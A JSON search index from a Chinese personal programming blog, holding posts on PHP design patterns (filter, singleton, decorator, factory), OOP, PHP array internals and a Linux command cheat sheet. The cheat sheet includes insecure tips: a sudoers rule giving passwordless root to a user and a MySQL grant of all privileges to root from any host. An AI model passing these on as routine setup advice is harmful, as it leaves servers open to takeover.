Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。这种类型的设计模式属于结构型模式，它结合多个标准来获得单一标准。 日常生活中也有过滤器，这个比较容易理解，就是使用设备过滤出自己想要的，去掉那些不符合条件的。但是在编程里面是怎么实现的呢？ 举个例子，有一组用户参与抽奖活动，我们需要筛选一部分符合条件的用户抽奖，其它不符合条件的用户咱直接提示未中奖！比如说需要注册时间大于3个月、消费金额大于100元、没有违规行为、活跃度大约500、性别为女。。。等条件！ 有人说问为什么不使用数据库筛选，一条sql数据就搞定了啊，实际上有可能是因为这些数据并不是在一个表里面，有些数据可能需要计算得出。","text":"过滤器模式 过滤器模式（Filter Pattern）或标准模式（Criteria Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。这种类型的设计模式属于结构型模式，它结合多个标准来获得单一标准。 日常生活中也有过滤器，这个比较容易理解，就是使用设备过滤出自己想要的，去掉那些不符合条件的。但是在编程里面是怎么实现的呢？ 举个例子，有一组用户参与抽奖活动，我们需要筛选一部分符合条件的用户抽奖，其它不符合条件的用户咱直接提示未中奖！比如说需要注册时间大于3个月、消费金额大于100元、没有违规行为、活跃度大约500、性别为女。。。等条件！ 有人说问为什么不使用数据库筛选，一条sql数据就搞定了啊，实际上有可能是因为这些数据并不是在一个表里面，有些数据可能需要计算得出。 普通写法： 12345678循环所有用户...if 注册时间 &lt; 3个月 &#123; 出局;&#125;if 消费金额 &lt; 100 &#123; 出局;&#125; 这种写法没问题，写业务代码的时候大部分都是这么做，但是如果当你的业务逻辑十分复杂的时候，这样写容易乱，不容易维护。 下面展示使用过滤器模式的写法： 首先，我们需要一个用户类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpnamespace App\\Filter;class User&#123; private $id; private $name; private $age; private $gender; public function __construct($id, $name, $age, $gender) &#123; $this-&gt;id = $id; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; /** * @return mixed */ public function getName() &#123; return $this-&gt;name; &#125; /** * @param mixed $name */ public function setName($name): void &#123; $this-&gt;name = $name; &#125; /** * @return mixed */ public function getAge() &#123; return $this-&gt;age; &#125; /** * @param mixed $age */ public function setAge($age): void &#123; $this-&gt;age = $age; &#125; /** * @return mixed */ public function getGender() &#123; return $this-&gt;gender; &#125; /** * @param mixed $gender */ public function setGender($gender): void &#123; $this-&gt;gender = $gender; &#125;&#125; Filter接口： 12345678&lt;?phpnamespace App\\Filter;interface Filter&#123; public function filter(array $users): array;&#125; AgeFiler: 12345678910111213141516171819&lt;?phpnamespace App\\Filter;class AgeFilter implements Filter&#123; public function filter(array $users): array &#123; $result = []; foreach ($users as $user) &#123; if ($user-&gt;getAge() &gt; 25) &#123; $result[] = $user; &#125; &#125; return $result; &#125;&#125; MaleFilter: 12345678910111213141516171819&lt;?phpnamespace App\\Filter;class MaleFilter implements Filter&#123; public function filter(array $users): array &#123; $result = []; foreach ($users as $user) &#123; if ($user-&gt;getGender() == '男') &#123; $result[] = $user; &#125; &#125; return $result; &#125;&#125; 最后使用： 123456789101112131415161718&lt;?phpinclude \"../include.php\";$users = [];$users[] = new \\App\\Filter\\User(1, \"1\", 25, \"男\");$users[] = new \\App\\Filter\\User(2, \"2\", 35, \"男\");$users[] = new \\App\\Filter\\User(3, \"3\", 27, \"女\");$users[] = new \\App\\Filter\\User(4, \"4\", 21, \"男\");$users[] = new \\App\\Filter\\User(5, \"5\", 24, \"女\");$ageFilter = new \\App\\Filter\\AgeFilter();$result = $ageFilter-&gt;filter($users);$maleFilter = new \\App\\Filter\\MaleFilter();$result = $maleFilter-&gt;filter($result);var_dump($result); 这个例子比较简单，也不算太恰当，实际应用中，过滤器模式很多地方都用，比如PHP自带的就有一个Filter类,有一些类似 filter_input 这样的方法可以用来过滤变量。在laravel框架里面利用管道过滤器模式实现了middleware(中间件)，非常方便，在实现功能的同时增加了项目的可维护性。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP设计模式之单例模式","slug":"php-designpattern-single","date":"2016-11-25T10:00:00.000Z","updated":"2020-01-08T09:43:32.181Z","comments":true,"path":"2016/11/25/php-designpattern-single/","link":"","permalink":"https://wangbjun.github.io/2016/11/25/php-designpattern-single/","excerpt":"单例模式（Singleton Pattern）是最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。 这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。 最大好处是减少了内存的开销，尤其是频繁的创建和销毁实例，而且可以避免对一些资源的多重占用，对于PHP Web应用来说，虽然每次请求结束之后所有对象都会被销毁，但是依然有意义。 举个例子，一个请求有好几个操作，必须调用好几个对象的不同方法，刚好在这个几个方法里面都会用到redis，如果不使用单例模式，那么在每个对象里面都会重新实例化一次redis，浪费内存和时间，建立网络连接也耗时，但是如果使用单例，则只需要在第一次调用redis的使用实例化对象。","text":"单例模式（Singleton Pattern）是最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。 这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。 最大好处是减少了内存的开销，尤其是频繁的创建和销毁实例，而且可以避免对一些资源的多重占用，对于PHP Web应用来说，虽然每次请求结束之后所有对象都会被销毁，但是依然有意义。 举个例子，一个请求有好几个操作，必须调用好几个对象的不同方法，刚好在这个几个方法里面都会用到redis，如果不使用单例模式，那么在每个对象里面都会重新实例化一次redis，浪费内存和时间，建立网络连接也耗时，但是如果使用单例，则只需要在第一次调用redis的使用实例化对象。 这里就拿Redis举例，私有化构造方法和clone方法，然后提供一个静态方法用于实例化对象： 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace App\\Single;class Redis&#123; private function __construct() &#123; echo \"Connect to redis...\\n\"; &#125; private function __clone() &#123; &#125; private static $instance = null; public static function getRedis() &#123; if (static::$instance == null) &#123; static::$instance = new static(); &#125; return static::$instance; &#125; public function showMsg() &#123; echo \"Hello World\\n\"; &#125;&#125; 调用的时候： 1234567891011121314151617&lt;?phprequire \"../include.php\";$redis = \\App\\Single\\Redis::getRedis();$redis-&gt;showMsg();$redis = \\App\\Single\\Redis::getRedis();$redis-&gt;showMsg();$redis = \\App\\Single\\Redis::getRedis();$redis = \\App\\Single\\Redis::getRedis();$redis-&gt;showMsg(); 结果： 123Connect to redis...Hello WorldHello World 从结果可以看到，无论你调用几次，构造方法只会只会执行一次, 说明redis类只实例化了一次。在Java里面可能还有饿汉式和懒汉式之分，不过在PHP里面由于语言特性限制，实际上只有一种模式，就是上面的饿汉式，而且PHP也不存在多线程问题（原生不支持多线程）！ 有个小坑，需要说一下，PHP有多进程的扩展pcntl 和 多线程扩展pthread，如果你使用了这些扩展的话，最好不要使用单例模式，这会带来争用问题，产生很多意想不到的结果，而PHP又没提供类似Java那样的synchronized关键字用于加锁，所以咯，最简单的方法就是在每个进程\\线程里面单独实例化。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"PHP设计模式之装饰器模式","slug":"php-designpattern-decorator","date":"2016-11-21T03:20:08.000Z","updated":"2020-01-08T09:43:32.133Z","comments":true,"path":"2016/11/21/php-designpattern-decorator/","link":"","permalink":"https://wangbjun.github.io/2016/11/21/php-designpattern-decorator/","excerpt":"装饰器模式 动态地给一个对象添加一些额外的职责，就增加功能来说，装饰器模式比生成子类更为灵活；它允许向一个现有的对象添加新的功能，同时又不改变其结构。 这个模式算是比较容易理解，它主要解决类的功能扩展问题，当我们需要给一个类增加功能时候，我们可以选直接修改当前类，也可以继承当前类然后增加新方法。但是装饰模式更强调的是动态扩展类的功能，而不是直接修改类的功能。 举个例子：大家早餐买煎饼果子的时候，可以选择加鸡蛋、辣条、火腿肠，但是也可以选择什么都不加。","text":"装饰器模式 动态地给一个对象添加一些额外的职责，就增加功能来说，装饰器模式比生成子类更为灵活；它允许向一个现有的对象添加新的功能，同时又不改变其结构。 这个模式算是比较容易理解，它主要解决类的功能扩展问题，当我们需要给一个类增加功能时候，我们可以选直接修改当前类，也可以继承当前类然后增加新方法。但是装饰模式更强调的是动态扩展类的功能，而不是直接修改类的功能。 举个例子：大家早餐买煎饼果子的时候，可以选择加鸡蛋、辣条、火腿肠，但是也可以选择什么都不加。 1.煎饼果子接口类：12345678910&lt;?phpnamespace App\\Decorator;interface IPancake&#123; public function price(); public function cook();&#125; 2.具体的煎饼生产类：12345678910111213141516&lt;?phpnamespace App\\Decorator;class Pancake implements IPancake&#123; public function price() &#123; return 5; &#125; public function cook() &#123; echo \"制作煎饼...\\n\"; &#125;&#125; 3.煎饼装饰抽象类：123456789101112131415161718&lt;?phpnamespace App\\Decorator;abstract class PancakeDecorator implements IPancake&#123; private $pancake; public function __construct(IPancake $pancake) &#123; $this-&gt;pancake = $pancake; &#125; public function cook() &#123; $this-&gt;pancake-&gt;cook(); &#125;&#125; 4.具体装饰类一：12345678910111213141516171819202122&lt;?phpnamespace App\\Decorator;class EgeDecorator extends PancakeDecorator&#123; public function __construct(IPancake $pancake) &#123; parent::__construct($pancake); &#125; public function cook() &#123; echo \"加了一个鸡蛋...\\n\"; parent::cook(); &#125; public function price() &#123; return 1; &#125;&#125; 5.具体装饰类二：12345678910111213141516171819202122&lt;?phpnamespace App\\Decorator;class HTCDecorator extends PancakeDecorator&#123; public function __construct(IPancake $pancake) &#123; parent::__construct($pancake); &#125; public function cook() &#123; echo \"加了一根火腿肠...\\n\"; parent::cook(); &#125; public function price() &#123; return 1.5; &#125;&#125; 6.使用结果：12345678910111213141516171819202122232425262728293031323334&lt;?phprequire_once \"../include.php\";$cake = new \\App\\Decorator\\Pancake();$cake-&gt;cook();echo \"-----------------------------------------\\n\";$egeCake = new \\App\\Decorator\\EgeDecorator($cake);$egeCake-&gt;cook();echo \"-----------------------------------------\\n\";$htcCake = new \\App\\Decorator\\HTCDecorator($cake);$htcCake-&gt;cook();echo \"-----------------------------------------\\n\";$htcCake = new \\App\\Decorator\\HTCDecorator($egeCake);$htcCake-&gt;cook();//结果如下：制作煎饼...-----------------------------------------加了一个鸡蛋...制作煎饼...-----------------------------------------加了一根火腿肠...制作煎饼...-----------------------------------------加了一根火腿肠...加了一个鸡蛋...制作煎饼... 从这里看出，使用装饰模式，我们可以非常方便的动态扩展当前类的功能，可以随意组合装饰类实现类功能扩展！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"Linux常用命令和工具","slug":"linux-command-usage","date":"2016-11-02T06:01:00.000Z","updated":"2020-01-08T17:44:37.439Z","comments":true,"path":"2016/11/02/linux-command-usage/","link":"","permalink":"https://wangbjun.github.io/2016/11/02/linux-command-usage/","excerpt":"1.备份命令： 1tar cvpzf backup.tgz --exclude&#x3D;&#x2F;proc --exclude&#x3D;&#x2F;lost+found --exclude&#x3D;&#x2F;root&#x2F;backup.tgz --exclude&#x3D;&#x2F;mnt --exclude&#x3D;&#x2F;sys --exclude&#x3D;&#x2F;media &#x2F; 2.查看目录大小： 123du -shdu -h --max-depth 1du -Sh 3.返回上次命令行位置： 1cd - 4.ssh秘钥免密登录 1231.ssh-keygen -t rsa #创建公钥2.scp &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@45.32.30.198:~&#x2F;.ssh3.cat id_rsa.pub &gt;&gt; authorized_keys","text":"1.备份命令： 1tar cvpzf backup.tgz --exclude&#x3D;&#x2F;proc --exclude&#x3D;&#x2F;lost+found --exclude&#x3D;&#x2F;root&#x2F;backup.tgz --exclude&#x3D;&#x2F;mnt --exclude&#x3D;&#x2F;sys --exclude&#x3D;&#x2F;media &#x2F; 2.查看目录大小： 123du -shdu -h --max-depth 1du -Sh 3.返回上次命令行位置： 1cd - 4.ssh秘钥免密登录 1231.ssh-keygen -t rsa #创建公钥2.scp &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@45.32.30.198:~&#x2F;.ssh3.cat id_rsa.pub &gt;&gt; authorized_keys 5.端口占用情况 1netstat -anp 6.格式化U盘 123fdisk -lfdisk &#x2F;dev&#x2F;sdcmkfs -t ntfs &#x2F;dev&#x2F;sdc1 7.后台运行命令 1nohup ping 192.168.2.1 &gt;&gt; no.log 2&gt;&amp;1 &amp; 8.crontab定时任务 12345678minute： 表示分钟，可以是从0到59之间的任何整数hour：表示小时，可以是从0到23之间的任何整数day：表示日期，可以是从1到31之间的任何整数month：表示月份，可以是从1到12之间的任何整数week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。*&#x2F;5 * * * * command #每5分钟执行一次* * * * * co 9.语言包问题 12345678910export LANGUAGE&#x3D;zh_CN.UTF-8export LANG&#x3D;zh_CN.UTF-8export LC_ALL&#x3D;zh_CN.UTF-8sudo locale-gen zh_CN.UTF-8vim &#x2F;etc&#x2F;default&#x2F;localeLANG&#x3D;&quot;en_US.UTF-8&quot;LANGUAGE&#x3D;&quot;en_US.UTF-8&quot;LC_ALL&#x3D;&quot;en_US.UTF-8&quot;apt-get install language-pack-en-base vagrant plugin install vagrant-vbguest 10.测速软件 1apt-get install python-pippip install speedtest-clispeedtest-cli 11.docker 1docker run -it --add-host localmysql:127.0.0.1 -p 192.168.0.109:8080:80 -v &#x2F;home&#x2F;jwang&#x2F;Documents&#x2F;work&#x2F;ycg:&#x2F;var&#x2F;www&#x2F;ycg ubuntu:14.10 12.设置ubuntu系统cpu调度器为performance 1sudo vim &#x2F;etc&#x2F;init.d&#x2F;cpufrequtilsGOVERNOR&#x3D;&quot;performance&quot; 13.sudo不用输密码 1my-username ALL&#x3D;(ALL) NOPASSWD: ALL 14.切换PHP版本 12sudo update-alternatives --query phpsudo update-alternatives --set php &#x2F;usr&#x2F;bin&#x2F;php5.6 15.mysql开启远程访问 121.bind_address 注释掉2.grant all on *.* to root@&#39;%&#39; identified by &#39;password&#39;; 16.unzip解压中文乱码 1unzip -O CP936 xxx.zip (用GBK, GB18030也可以) 17.开机自启 12sudo update-rc.d apache2 defaults sudo update-rc.d -f apache2 remove 18.时区问题 1234hwclock -r #查看时钟date #查看时间tzselect #选择时区TZ&#x3D;&#39;Asia&#x2F;Shanghai&#39;; export TZ #设置时区 19.流量监控 12sudo add-apt-repository ppa:nilarimogard&#x2F;webupd8sudo apt-get install indicator-netspeed 20.设置CPU governor 1234sudo apt-get install cpufrequtilssudo cpufreq-set -r -g performance&#96;&#96;&#96; 21.合并音视频 sudo ffmpeg -i out.mp4 -i sound.mp3 -vcodec copy -acodec copy out.mp4 122.查找kill进程 sudo ps -axu|grep QQ |awk -F” “ ‘{print $2}’|xargs kill -9","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/tags/Linux/"}]},{"title":"PHP设计模式之简单工厂模式","slug":"php-designpattern-factory","date":"2016-09-05T07:00:00.000Z","updated":"2020-01-08T09:43:32.257Z","comments":true,"path":"2016/09/05/php-designpattern-factory/","link":"","permalink":"https://wangbjun.github.io/2016/09/05/php-designpattern-factory/","excerpt":"这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。 工厂模式其实就是用来创建对象的，对象是什么的，当然是类的实例，在学习设计模式之前，请先回忆一下面向对象编程，牢记面向对象三大特性：封装，继承，多态！很多语言并不是完全面向对象的，比如PHP，JS等脚本语言，但这并无妨碍我们去学习其设计思想，但是我们必须从面向对象的思路去理解这种设计！ 在完全面向对象的世界里面，首先必须有类，然后才有对象，对象有属性和方法，在程序运行的时候我们需要先创建一个类，然后使用 new 去实例化一个类得到一个对象，然后去调用这个类的相关属性活方法。","text":"这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。 工厂模式其实就是用来创建对象的，对象是什么的，当然是类的实例，在学习设计模式之前，请先回忆一下面向对象编程，牢记面向对象三大特性：封装，继承，多态！很多语言并不是完全面向对象的，比如PHP，JS等脚本语言，但这并无妨碍我们去学习其设计思想，但是我们必须从面向对象的思路去理解这种设计！ 在完全面向对象的世界里面，首先必须有类，然后才有对象，对象有属性和方法，在程序运行的时候我们需要先创建一个类，然后使用 new 去实例化一个类得到一个对象，然后去调用这个类的相关属性活方法。 举个最简单的例子： 1234567891011121314&lt;?phpclass FileLog &#123; public $file; public function log($param) &#123; echo \"Log $param to $this-&gt;file!\\n\"; &#125;&#125;$logger = new FileLog();$logger-&gt;file = \"/data/log.log\";$logger-&gt;log(\"something\"); 大部分时候我们这么用就可以了，十分简单方便，但是使用建造中模式我们可以更灵活的创建对象，比如说我们系统里面支持2种日志记录方式，一个是文件日志，一个是mongo日志，他们都有一个共同的功能那就是记录日志！可以采用如下设计： 我们先定义一个接口Log.php : 12345678&lt;?phpnamespace App\\SimpleFactory;interface Log&#123; public function log(string $param);&#125; 然后创建2个类实现这个接口： FileLog.php 1234567891011&lt;?phpnamespace App\\SimpleFactory;class FileLog implements Log&#123; public function log(string $param) &#123; echo \"Log $param to File\\n\"; &#125;&#125; MongoLog.php 1234567891011&lt;?phpnamespace App\\SimpleFactory;class MongoLog implements Log&#123; public function log(string $param) &#123; echo \"Log $param to Mongo\\n\"; &#125;&#125; 这时候我们需要一个工厂去生产这个日志对象 LogFactory.php： 12345678910111213141516171819&lt;?phpnamespace App\\SimpleFactory;class LogFactory&#123; const FILE_LOG = 1; const MONGO_LOG = 2; public function getLogger(string $logType): Log &#123; if ($logType == self::MONGO_LOG) &#123; return new MongoLog(); &#125; return new FileLog(); &#125;&#125; 最后，新建一个demo.php验证是否可以使用，这里我使用了 spl_autoload_register 解决了文件加载问题: 1234567891011&lt;?phprequire \"../include.php\";$factory = new \\App\\SimpleFactory\\LogFactory();$fileLog = $factory-&gt;getLogger($factory::FILE_LOG);$fileLog-&gt;log(\"something\");$mongoLog = $factory-&gt;getLogger($factory::MONGO_LOG);$mongoLog-&gt;log(\"something\"); 这种设计至少有一个好处可以灵活的切换日志类型，而且对于调用者来说他只需传一个参数即可，屏蔽了创建过程中的细节，实际应用中我们可以在创建对象的过程中做一些初始化工作！ 接下来我们会讲一下工厂方法模式，这是简单工厂模式的改进版！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"闲谈PHP面向对象编程","slug":"php-oop-thinking","date":"2016-03-09T07:00:00.000Z","updated":"2020-01-08T09:43:32.221Z","comments":true,"path":"2016/03/09/php-oop-thinking/","link":"","permalink":"https://wangbjun.github.io/2016/03/09/php-oop-thinking/","excerpt":"","text":"关于面向过程和面向对象编程之间的区别这里不多说,简单看了一个例子,如何解决把大象装进冰箱这个问题? 面向过程方案:第一步.打开冰箱 第二步.把大象放进冰箱 第三步,关上冰箱 这个方案看上去没什么毛病,简单明了,当然第二步可以拆分的更细,拆成更多小步骤!用代码简单演示如下: 123456789101112131415161718192021&lt;?php&#x2F;&#x2F;1.打开冰箱function openFridge($fridge)&#123; echo &quot;打开冰箱:&quot; . $fridge[&#39;name&#39;];&#125;&#x2F;&#x2F;2.放置大象function placeElephant($elephant, $fridge)&#123; if ($elephant[&#39;weight&#39;] &gt; $fridge[&#39;width&#39;]) &#123; echo &quot;大象太大了!&quot;; return false; &#125; echo &quot;把&#123;$elephant[&#39;name&#39;]&#125;放进去:&quot; . $fridge[&#39;name&#39;]; return true;&#125;&#x2F;&#x2F;3.关上冰箱function closeFridge($fridge)&#123; echo &quot;关掉冰箱:&quot; . $fridge[&#39;name&#39;];&#125; 然后实际操作的代码: 12345678910111213$fridge &#x3D; [ &#39;name&#39; &#x3D;&gt; &#39;西门子冰箱&#39;, &#39;width&#39; &#x3D;&gt; 20, &#39;height&#39; &#x3D;&gt; 50,];$elephant &#x3D; [ &#39;name&#39; &#x3D;&gt; &#39;非洲大象&#39;, &#39;weight&#39; &#x3D;&gt; 100,];&#x2F;&#x2F;三步走openFridge($fridge);placeElephant($elephant, $fridge);closeFridge($fridge); 面向过程编程典型的做法就是定义一大堆函数,一个函数干一件事,然后依次调用各个函数完成一个功能.优点也有,比如简单省事,缺点也很多,比如项目大了之后维护是噩梦! 面向对象方案:首先,得有2个类,一个是大象类: 123456789101112&#x2F;&#x2F;大象类class Elephant&#123; private $name; private $weight; public function __construct($name, $weight) &#123; $this-&gt;name &#x3D; $name; $this-&gt;weight &#x3D; $weight; &#125; ....&#125; 另一个是冰箱类: 12345678910111213141516171819202122class Fridge&#123; private $name; private $width; public function __construct($name, $width) &#123; $this-&gt;name &#x3D; $name; $this-&gt;width &#x3D; $width; &#125; public function open() &#123; echo &quot;打开&#123;$this-&gt;name&#125;冰箱&quot;; &#125; public function close() &#123; echo &quot;关闭&#123;$this-&gt;name&#125;冰箱&quot;; &#125; public function store($something) &#123; echo &quot;放置&#123;$something&#125;&quot;; &#125;&#125; 实际操作的时候代码: 12345$e &#x3D; new Elephant(&#39;非洲大象&#39;, 12);$f &#x3D; new Fridge(&#39;西门子冰箱&#39;, 25);$f-&gt;open();$e-&gt;store($e);$f-&gt;close(); 当然这里还有一点小疑问,那就是大象放进冰箱这个操作是属于哪个对象?是冰箱的功能,还是大象的功能?换句话说是大象自己走进冰箱,还是大象被放进冰箱呢?很多时候,这2种方案都能实现你所需要的功能,那就得结合实际情况分析了! 换一种思路,假如说,我们定义冰箱有一个功能就是放东西,但是这个东西必须满足一定条件,比如说让对象自己选择采用何种方式放进冰箱等等,这时候我们可以定义一个接口: 1234interface Fridgeable&#123; public function intoFridge();&#125; 然后让需要放进冰箱的对象实现这个接口: 123456789class Elephant implements Fridgeable&#123; .... &#x2F;&#x2F;实现接口 public function intoFridge() &#123; echo &quot;大象飞进了冰箱&quot;; &#125;&#125; 这时候冰箱类就可以这样写: 12345678...public function store(Fridgeable $fridgeable)&#123; $this-&gt;open(); $fridgeable-&gt;intoFridge(); $this-&gt;close();&#125;... 这时候操作就变成: 123$e &#x3D; new Elephant(&#39;非洲大象&#39;, 12);$f &#x3D; new Fridge(&#39;西门子冰箱&#39;, 25);$f-&gt;store($e); 假如这时候还有一直兔子也要放进冰箱,我们只需要让这个兔子也实现这个接口即可: 123456789class rabbit implements Fridgeable&#123; .... &#x2F;&#x2F;实现接口 public function intoFridge() &#123; echo &quot;兔子钻进了冰箱&quot;; &#125;&#125; 而这种设计思想就叫依赖注入,又叫控制反转.冰箱只要定义好一个接口,所有想放进冰箱的对象只要实现这个接口就可以了,这样我们就不用在冰箱里面写一大堆代码,实现了解耦和扩展性! 好啦,就说这么多了,如果不恰当的地方请指正哈!","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"OOP","slug":"OOP","permalink":"https://wangbjun.github.io/tags/OOP/"}]},{"title":"PHP数组解析和常见操作","slug":"php-array","date":"2016-02-05T11:00:03.000Z","updated":"2020-01-09T08:04:25.863Z","comments":true,"path":"2016/02/05/php-array/","link":"","permalink":"https://wangbjun.github.io/2016/02/05/php-array/","excerpt":"在PHP里面使用最多的数据结构恐怕就是数组了，不过PHP的数组和我们传统意义上的数组区别很大，PHP的数组功能上相当于其它语言里面array+list+map数据结构的集合体，这就是动态语言的强大之处。在PHP里面有2种数组，一种是传统的索引数组，另一种是关联数组，其实就是其它语言里面map数据结构。 底层实现PHP的数组底层是使用HashTable实现，说到哈希表估计很多人都了解过，PHP数组通过一个映射函数把key映射到对于的value值上面，所以查找起来非常快，时间复杂度是O(1),哈希表都会遇到冲突问题，在PHP里面是通过链表的方式解决的。 123456789101112131415161718192021222324252627282930&#x2F;&#x2F;Bucket：散列表中存储typedef struct _Bucket &#123; zval val; &#x2F;&#x2F;存储的具体value，这里嵌入了一个zval，而不是一个指针 zend_ulong h; &#x2F;&#x2F;key根据times 33计算得到的哈希值，或者是数值索引编号 zend_string *key; &#x2F;&#x2F;存储元素的key&#125; Bucket; &#x2F;&#x2F;HashTable结构typedef struct _zend_array HashTable; struct _zend_array &#123; zend_refcounted_h gc; union &#123; struct &#123; ZEND_ENDIAN_LOHI_4( zend_uchar flags, zend_uchar nApplyCount, zend_uchar nIteratorsCount, zend_uchar reserve) &#125; v; uint32_t flags; &#125; u; uint32_t nTableMask; &#x2F;&#x2F;哈希值计算掩码，等于nTableSize的负值(nTableMask &#x3D; -nTableSize) Bucket *arData; &#x2F;&#x2F;存储元素数组，指向第一个Bucket uint32_t nNumUsed; &#x2F;&#x2F;已用Bucket数 uint32_t nNumOfElements; &#x2F;&#x2F;哈希表有效元素数 uint32_t nTableSize; &#x2F;&#x2F;哈希表总大小，为2的n次方 uint32_t nInternalPointer; zend_long nNextFreeElement; &#x2F;&#x2F;&#x2F;&#x2F;下一个可用的数值索引,如:arr[] &#x3D; 1;arr[&quot;a&quot;] &#x3D; 2;arr[] &#x3D; 3;则nNextFreeElement &#x3D; 2; dtor_func_t pDestructor;","text":"在PHP里面使用最多的数据结构恐怕就是数组了，不过PHP的数组和我们传统意义上的数组区别很大，PHP的数组功能上相当于其它语言里面array+list+map数据结构的集合体，这就是动态语言的强大之处。在PHP里面有2种数组，一种是传统的索引数组，另一种是关联数组，其实就是其它语言里面map数据结构。 底层实现PHP的数组底层是使用HashTable实现，说到哈希表估计很多人都了解过，PHP数组通过一个映射函数把key映射到对于的value值上面，所以查找起来非常快，时间复杂度是O(1),哈希表都会遇到冲突问题，在PHP里面是通过链表的方式解决的。 123456789101112131415161718192021222324252627282930&#x2F;&#x2F;Bucket：散列表中存储typedef struct _Bucket &#123; zval val; &#x2F;&#x2F;存储的具体value，这里嵌入了一个zval，而不是一个指针 zend_ulong h; &#x2F;&#x2F;key根据times 33计算得到的哈希值，或者是数值索引编号 zend_string *key; &#x2F;&#x2F;存储元素的key&#125; Bucket; &#x2F;&#x2F;HashTable结构typedef struct _zend_array HashTable; struct _zend_array &#123; zend_refcounted_h gc; union &#123; struct &#123; ZEND_ENDIAN_LOHI_4( zend_uchar flags, zend_uchar nApplyCount, zend_uchar nIteratorsCount, zend_uchar reserve) &#125; v; uint32_t flags; &#125; u; uint32_t nTableMask; &#x2F;&#x2F;哈希值计算掩码，等于nTableSize的负值(nTableMask &#x3D; -nTableSize) Bucket *arData; &#x2F;&#x2F;存储元素数组，指向第一个Bucket uint32_t nNumUsed; &#x2F;&#x2F;已用Bucket数 uint32_t nNumOfElements; &#x2F;&#x2F;哈希表有效元素数 uint32_t nTableSize; &#x2F;&#x2F;哈希表总大小，为2的n次方 uint32_t nInternalPointer; zend_long nNextFreeElement; &#x2F;&#x2F;&#x2F;&#x2F;下一个可用的数值索引,如:arr[] &#x3D; 1;arr[&quot;a&quot;] &#x3D; 2;arr[] &#x3D; 3;则nNextFreeElement &#x3D; 2; dtor_func_t pDestructor; PHP7源码里面具体涉及到结构体如上，源码我就不解读了，主要是我也不太熟悉，只是看过一些介绍文章，但是希望大家可以了解一下，下面我主要介绍一下PHP数组的一些常用函数，回顾一下基础。 常用函数PHP的数组函数非常多，但是说起这点我就头疼，PHP的数组函数命名有些非常奇葩，有以array_开头的,也有一些不知道根据啥命名的…下面我就分类介绍一下： 1.排序类12&#x2F;&#x2F; 默认排序是按从低到高，而且是引用传递，第二个参数可以选择排序类型sort ( array &amp;$array [, int $sort_flags &#x3D; SORT_REGULAR ] ) : bool 然后是一些以a、r、k、u组合的函数，不得不说这命名是真烂！ 1234a 是associate，意思是排序是保留索引关联，最常见的是 asortr 是reverse，意思是逆序排，最常见的就是 rsortk 是key，意思是按照数组的key进行排序，保留索引关联，主要是用于关联数组，最常见的就是 ksortu 是user，意思使用用户自定义函数的函数排序，最常见的就是 usort 好了，除了上面这4个之外，其它就是这几个字母的组合的函数了，比如 arsort 是保留索引倒序排序、uksort 使用用户自定义的比较函数对数组中的键名进行排序，其它我就不多说了。 2.遍历类除了可以使用for 和 foreach循环遍历数组之外，PHP还有很多其它遍历数组，并且操作数组的函数 123456789101112&#x2F;&#x2F;为数组的每个元素应用回调函数array_map ( callable $callback , array $array1 [, array $... ] ) : array&#x2F;&#x2F;使用用户自定义函数对数组中的每个元素做回调处理array_walk ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : boolarray_walk_recursive — 对数组中的每个成员递归地应用用户函数array_reduce — 用回调函数迭代地将数组简化为单一的值array_replace_recursive — 使用传递的数组递归替换第一个数组的元素 3.其它123456789101112131415161718192021222324252627array_flip — 交换数组中的键和值array_reverse — 